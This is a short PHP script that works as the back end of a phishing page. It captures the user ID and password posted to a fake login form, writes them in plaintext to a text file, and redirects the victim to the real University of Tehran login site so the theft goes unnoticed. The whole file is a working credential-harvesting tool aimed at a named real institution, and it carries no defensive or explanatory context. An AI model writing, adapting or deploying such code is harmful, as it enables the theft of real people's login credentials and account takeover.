<?php
$id = $_POST["userID"];
$pass =  $_POST["password"];

if (!empty($id) & !empty($pass)){
    $myFile = fopen("usersInfo.txt", "a+") or die("Unable to open file!");
    $txt = "ID: ".$id . "\t Pass: " . $pass . "\n";
    fwrite($myFile, $txt);
    fclose($myFile);
}
header( "Location: https://utid.ut.ac.ir/user/login" );
exit ;


//https://utid.ut.ac.ir
